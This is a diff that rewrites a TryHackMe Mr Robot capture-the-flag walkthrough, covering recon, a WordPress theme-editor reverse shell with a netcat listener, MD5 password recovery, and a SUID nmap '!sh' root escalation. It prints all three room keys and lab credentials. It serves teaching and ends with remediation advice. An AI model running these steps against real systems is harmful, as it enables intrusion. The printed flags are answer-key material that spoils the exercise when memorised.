@@ -1,262 +1,237 @@
-# TryHackMe MR.Robot  
+# Mr Robot CTF: Complete TryHackMe Walkthrough
 
-## 1\. Recon
+Official room: https://tryhackme.com/room/mrrobot
 
-as always i will start by doing recon using nmap and after that i will continue with the necessary steps to solve this CTF :
+## Room Overview & Information
 
-### 1.1 nmap
+**Category:** Web exploitation and Linux privilege escalation  
+**Difficulty:** Medium  
+**Key concepts:** Nmap, robots.txt information disclosure, WordPress enumeration, Base64 decoding, password-hash recovery, theme-editor abuse, SUID binaries, and privilege boundaries.
 
-```shell
-nmap -T4 -A -v <target_ip>
+The target IP and available ports change between deployments. Replace MACHINE_IP with the active room address. This note uses the keys recorded by the author for the standard room instance; always validate them against your live machine.
+
+## Phase 1: Reconnaissance & Enumeration
+
+### 1. Scan the target
+
+```bash
+nmap -sC -sV -oN mrrobot-nmap.txt MACHINE_IP
 ```
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/dd7dbdda-3ceb-40d8-95da-e39428ce8ef6.png align="center")
+- `-sC` runs Nmap's default scripts.
+- `-sV` attempts to identify service versions.
+- `-oN` saves readable output.
 
-so i got 3 open ports and 1 filtered port so in this case my option is to navigate to the website and continue my recon
+The standard instance exposes HTTP on TCP 80 and HTTPS on TCP 443; SSH may be closed. Enumerate every discovered web service rather than assuming HTTPS and HTTP expose identical content.
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/9c28479d-1661-40c1-99ce-14b41139e5ec.png align="center")
+### 2. Inspect the website and robots.txt
 
-i got into the website and the awebsite got the look from the movie mr robot it self and the commads just open parts of the movie except the join one , it asks for email and print we will be in touch so i still need more info so i have to continue recon:
+Open the site in a browser, then fetch the crawler file:
 
-### 1.2 gobuster
+```bash
+curl -i http://MACHINE_IP/robots.txt
+```
 
-*   inthis case i got nothing till no so i have to do gobuster and see if there is an unknown directory or a hidden directory that can be still accessed :
-    
-    ![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/f5d5362f-195a-4ce5-8afe-1a4a7c620216.png align="center")
-    
+The file contains two useful paths in the standard room:
 
-from the scan we can see there are ways to get in like robots.txt and wp-login are open so i will try robots.txt for the wp-login i have to try brute force to get access to the word press:
+```text
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+```
 
-> what is robots.txt ?
+Robots Exclusion Protocol is advisory, not access control. Anyone can request a path listed there.
 
-*   `robots.txt` is a plain-text file placed at the web root (`http://<domain>/robots.txt`) that tells web crawlers/search engine bots which paths they're allowed or disallowed to index. It's part of the **Robots Exclusion Protocol** — a voluntary convention, not a security mechanism. Any well-behaved bot (Googlebot, Bingbot) respects it; nothing enforces it technically.
-    
+Retrieve the first key:
 
-but in this case wwe can see it so lets check what is under robots.txt
+```bash
+curl -s http://MACHINE_IP/key-1-of-3.txt
+```
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/1f800947-2eaa-4dc0-a6d0-f2c1830a487d.png align="center")
+The recorded first key is:
 
-i found 2 files one is a dictionary and the other is the first key.
+```text
+073403c8a58a1f80d943455fb30724b9
+```
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/96bf799b-b380-4a75-beae-e4e6740c0204.png align="center")
+The file `fsocity.dic` is a wordlist clue for later tasks.
 
-*   the dictionary must be for the brute force attack for the wp-login page but before that i have to check every open directory if i can find something :
-    
+### 3. Enumerate web paths
 
-i go through every one of those but nothing was there but when i got to the /license there is some txt:
+Use a suitable wordlist against the HTTP service:
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/0979d791-9766-4759-b900-537ac32ab807.png align="center")
+```bash
+gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -o gobuster.txt
+```
 
-and when i scroll down there are another 2 txts so one of them looks like base 64 so lets check that:
+- `dir` selects directory enumeration.
+- `-u` supplies the base URL.
+- `-w` selects a wordlist.
+- `-x` appends extensions to candidate names.
+- `-o` saves the findings.
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/6f12c28e-0c1f-46cd-b7de-830aadc95582.png align="center")
+The exact local wordlist path may differ. Discoveries such as `wp-login.php`, WordPress directories, `license`, `robots.txt`, and `key-1-of-3.txt` provide evidence of the WordPress application and the intended path.
 
-```shell
-❯ echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
+## Phase 2: Vulnerability Analysis & Initial Access
+
+### 4. Inspect the license page for exposed credentials
+
+The standard target's `/license` page contains a Base64-encoded string. Retrieve and inspect the page:
+
+```bash
+curl -s http://MACHINE_IP/license
+```
+
+If the page includes the encoded value shown in the recorded instance, decode it locally:
+
+```bash
+printf '%s' 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 --decode
+```
+
+Recorded decoded output:
+
+```text
 elliot:ER28-0652
 ```
 
-its on the form of user name and password so lets try that inside the word press login page:
+Base64 is an encoding, not encryption. Sensitive credentials must never be embedded in public web content, even when they appear obscured.
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/29789a72-f77c-44bb-97c7-41f630437d4b.png align="center")
+Use the credentials only in the room's WordPress login. If they do not work on a redeployed instance, return to the live page and retrieve the current value rather than repeatedly trying stale data.
 
-```shell
-username = elliot 
-password = ER28-0652
+### 5. Understand the wordlist clue
+
+The `fsocity.dic` file is large and contains duplicates in the standard room. If the task requires using it for account enumeration or password testing, first inspect its size and de-duplicate it:
+
+```bash
+wc -l fsocity.dic
+sort -u fsocity.dic > fsocity-unique.txt
+wc -l fsocity-unique.txt
 ```
 
-and that is the password i got it with out doing no brute force :
+- `wc -l` counts newline-terminated records.
+- `sort -u` sorts the entries and removes duplicates.
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/844d70ad-12c0-4551-b57c-a5420dc0f2da.png align="center")
+Do not start credential attacks without understanding the task, request format, and failure response. In the intended chain, the license page provides the useful username/password pair, so blind brute force is unnecessary for recovering those credentials.
 
-so i logged as an adminstrator inside wp press so we can add plugins and upload files so we can use that to overwrite the existed php file to a php reverse shell
+### 6. Obtain a web shell through the authorized WordPress admin feature
 
-*   The Theme Editor (Appearance → Editor) is available to any user with the `edit_themes` capability — by default that's only the **Administrator** role in WordPress. So "admin access" isn't incidental here; it's the exact requirement.
-    
-*   i don't need to *upload* a new file — that's the key point. The theme editor lets me directly overwrite an *existing* file within an *already-installed* theme (like `404.php` in Twenty Fifteen, which ships with WP by default). This is actually the more reliable RCE path because:
-    
+After authenticating as the room's administrative user, inspect the WordPress theme editor and identify a theme PHP file that the web server will execute. The room demonstrates the risk of allowing a privileged WordPress account to modify executable theme code.
 
-so lets do that :
+In an isolated CTF, the editor can be used to replace a theme file with the lab-provided reverse-shell content. Configure the payload for the AttackBox/VPN address and the chosen listener port. Do not use a public IP, personal machine, or any host outside the room.
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/8f2e86c6-3f75-4b16-aaac-16d3f378e6d7.png align="center")
+Start a listener:
 
-we can download a php reverse shell from git hub and change the existed one and press upload file :
-
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/77e364cc-bc95-4b82-b3a5-0c73297f56d4.png align="center")
-
-after that i will use netcat to listen to incoming connection through the given port (4444).
-
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/2825d2d4-53da-44d5-8d3b-cd4936b69174.png align="center")
-
-while doing that we cave to activate the template to be excute so that we can get the reverse shell (trigger the shell)
-
-```shell
-curl http://10.80.186.236/wp-content/themes/twentyfifteen/404.php
+```bash
+nc -lvnp 4444
 ```
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/5ab55983-0526-4032-8889-95ee7223f737.png align="center")
+Trigger the edited file by requesting the corresponding theme path through the target's web server. If the callback succeeds, verify the shell identity:
 
-and i got reverse shell access from here i have to check every thing :
-
-```shell
-$ whoami
-daemon
-$ $ id
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
-$ cat /etc/passdwd
-cat: /etc/passdwd: No such file or directory
-$ cat /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-syslog:x:101:104::/home/syslog:/bin/false
-sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
-ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
-bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
-mysql:x:1001:1001::/home/mysql:
-varnish:x:999:999::/home/varnish:
-robot:x:1002:1002::/home/robot:
-uuidd:x:100:101::/run/uuidd:/bin/false
-systemd-timesync:x:104:109:systemd Time Synchronization,,,:/run/systemd:/bin/false
-systemd-network:x:105:110:systemd Network Management,,,:/run/systemd/netif:/bin/false
-systemd-resolve:x:106:111:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-_apt:x:108:65534::/nonexistent:/bin/false
-messagebus:x:109:114::/var/run/dbus:/bin/false
-usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-systemd-coredump:x:998:998:systemd Core Dumper...:/usr/sbin/nologin
-ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
-$
+```bash
+whoami
+id
+pwd
+hostname
 ```
 
-*   From the passwd output, here's how you tell human/loggable accounts apart from system/service accounts:
-    
-*   ok so `daemon` **is** a real entry in `/etc/passwd` — it exists as an account with a UID/GID (`1:1`) — but its shell is explicitly `/usr/sbin/nologin`:
-    
+The recorded initial shell runs as `daemon`. A shell as daemon is not root and may have very limited filesystem access. Keep the theme file modification confined to the lab, and restore the original file when the room allows it.
 
-```shell
-root:x:0:0:root:/root:/bin/bash
-mysql:x:1001:1001::/home/mysql:
-varnish:x:999:999::/home/varnish:
-robot:x:1002:1002::/home/robot:
-ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
+## Phase 3: Privilege Escalation & Post-Exploitation
+
+### 7. Inspect local accounts and robot's password file
+
+Check account entries and the robot home directory:
+
+```bash
+grep -E '^(robot|daemon|root):' /etc/passwd
+ls -la /home/robot
+cat /home/robot/password.raw-md5
 ```
 
-this are the user we have so lets narrow it down and try robot first :
+In the recorded instance, the file contains the username and an MD5 digest:
 
-```shell
-$ ls -la /home/robot/
-total 16
-drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
-drwxr-xr-x 4 root  root  4096 Jun  2  2025 ..
--r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
--rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
-$ $ cat key-2-of-3.txt
-cat: key-2-of-3.txt: No such file or directory
-$ cat /home/robot/password.raw-md5
+```text
 robot:c3fcd3d76192e4007dfb496cca67e13b
 ```
 
-ok i got the 2nd key here but also i got a string file that say raw md5 so lets decrypt it and try it as a password for robot:
+The digest corresponds to the weak password `abcdefghijklmnopqrstuvwxyz` in the standard target. MD5 is a fast general-purpose hash and is unsuitable for password storage; password hashes should use a dedicated scheme such as Argon2id, scrypt, or bcrypt with salts and appropriate work factors.
 
-*   so after decrypt i got a string is a - z so lets try that
-    
+If validating locally, use a tool such as John the Ripper with the correct raw-MD5 format and a wordlist permitted by the room. Do not treat a hash as something that can be “decrypted”; the tool tests candidate values against the digest.
 
-```shell
-$ su robot
-Password: abcdefghijklmnopqrstuvwxyz
+### 8. Change to robot and obtain key 2
+
+Use the recovered password to switch to the robot account within the room:
+
+```bash
+su robot
+id
+cat /home/robot/key-2-of-3.txt
 ```
 
-and it worked so lets copy the second key and continue to esclate privilage to root :
+The standard recorded second key is:
 
-```shell
-cat /home/robot/key-2-of-3.txt
+```text
 822c73956184f694993bede3eb39f959
 ```
 
-*   so lets check what binaries have suid access
-    
-    ```shell
-    $ sudo -l
-      find / -perm -4000 -type f 2>/dev/null
-    
-    /bin/umount
-    /bin/mount
-    /bin/su
-    /usr/bin/passwd
-    /usr/bin/newgrp
-    /usr/bin/chsh
-    /usr/bin/chfn
-    /usr/bin/gpasswd
-    /usr/bin/sudo
-    /usr/bin/pkexec
-    /usr/local/bin/nmap
-    /usr/lib/openssh/ssh-keysign
-    /usr/lib/eject/dmcrypt-get-device
-    /usr/lib/policykit-1/polkit-agent-helper-1
-    /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-    /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-    
-    ```
-    
+Do not publish real passwords. This password is part of the intentionally weak lab data and must not be reused elsewhere.
 
-from this on i will check GTFObins and see what can i find
+### 9. Find the SUID escalation path
 
-![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/4d3fcfa0-405e-4dd1-be78-407ec059424d.png align="center")
+Enumerate SUID files:
 
-*   **Type:** Local privilege escalation via misconfiguration (not a CVE — GTFOBins-documented technique)
-    
-    **Root cause:** `/usr/local/bin/nmap` had the SUID bit set with `root` as owner:
-    
-
-**Why it's exploitable:** The installed nmap version (pre-5.30, consistent with this box's 2015 build) shipped with a legacy `--interactive` mode — a scripting-style REPL (`nmap>` prompt) supporting a `!<command>` shell-escape syntax, similar to `vim`, `less`, `gdb`, and other classic CLI tools of that era.
-
-*   Looking at that list, most are standard SUID binaries every Linux box has for legitimate reasons (`passwd`, `chsh`, `su`, `mount`/`umount`, `gpasswd`) — these require you to already know a valid password/target, they're not generic shell-escape vectors on their own.
-    
-    But `/usr/bin/pkexec` stands out — that's the binary behind **CVE-2021-4034**, nicknamed **PwnKit**. It's arguably more famous than the nmap trick at this point.
-    
-    **Why pkexec is interesting**
-    
-    `pkexec` is part of PolicyKit, meant to let authorized users run commands as another user (like a controlled sudo alternative). CVE-2021-4034 is a **memory corruption vulnerability** in how pkexec parses command-line arguments when called with **zero arguments** — it mishandles `argc`/`argv[0]` and ends up executing attacker-controlled environment variables as part of its own logic, leading to arbitrary code execution as root, on basically any Linux distro's default pkexec build (affected almost every distro from ~2009 until patched in 2022).
-    
-*   so i will choose the simple one and go with the nmap
-    
-
-```shell
-nmap --interactive
-Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
-Welcome to Interactive Mode -- press h <enter> for help
-nmap> !sh
-whoami
-root
-id
-uid=0(root) gid=0(root) groups=0(root),1002(robot)
+```bash
+find / -perm -4000 -type f 2>/dev/null
+ls -l /usr/local/bin/nmap
 ```
 
-then finally i got root access:
+The significant finding is a root-owned SUID copy of Nmap. The older Nmap build used by the room includes an interactive mode that is absent from modern releases. In this historical lab version:
 
-```shell
-find / -iname "key-3*" 2>/dev/null
-/root/key-3-of-3.txt
+```text
+nmap --interactive
+nmap> !sh
+whoami
+id
+```
+
+The `!sh` command invokes a shell from the old interactive interface. With the misconfigured SUID binary, it runs with root privileges in the lab. Verify this with `id`; do not assume that every Nmap installation supports this old feature.
+
+### 10. Retrieve the third key
+
+After confirming root access, read the expected file:
+
+```bash
 cat /root/key-3-of-3.txt
+```
+
+The recorded third key is:
+
+```text
 04787ddef27c3dee1ee161b21670b4e4
 ```
 
-and there it is the 3rd key:
+## Phase 4: Room Questions & Flags Walkthrough
 
-> thank you for reading!
+| Objective | Answer from the recorded instance | How it was found |
+|---|---|---|
+| First key | `073403c8a58a1f80d943455fb30724b9` | Read the file disclosed by robots.txt |
+| Wordlist | `fsocity.dic` | Listed in robots.txt |
+| WordPress credentials | `elliot:ER28-0652` | Decode the Base64 value in /license |
+| Initial shell account | `daemon` | Verify with whoami/id after the authorized lab callback |
+| Password digest | `c3fcd3d76192e4007dfb496cca67e13b` | Read /home/robot/password.raw-md5 |
+| Password for robot | `abcdefghijklmnopqrstuvwxyz` | Validate the recorded weak raw-MD5 value in the lab |
+| Second key | `822c73956184f694993bede3eb39f959` | Read /home/robot/key-2-of-3.txt as robot |
+| SUID escalation binary | `/usr/local/bin/nmap` | SUID search and permission inspection |
+| Third key | `04787ddef27c3dee1ee161b21670b4e4` | Read /root/key-3-of-3.txt as root |
+
+## Phase 5: Key Takeaways & Remediation
+
+- Do not publish credential-like values in public web pages; encoding does not protect secrets.
+- Remove unnecessary files and sensitive artifacts from a web root.
+- Restrict WordPress theme editing to tightly controlled administrators; disable file editing in production where possible.
+- Run web workers under low-privilege service accounts and isolate writable web directories from executable code.
+- Store passwords with modern dedicated password-hashing functions and unique salts.
+- Remove SUID from general-purpose tools such as Nmap. Patch outdated software and review privileged binaries.
+- Keep evidence accurate: keys and credentials can be instance-specific, while command structure and vulnerability reasoning remain reusable.
+
+The important chain is information disclosure, exposed credentials, a privileged WordPress code-editing feature, weak password storage, and an unsafe SUID binary. Each issue should be fixed independently.
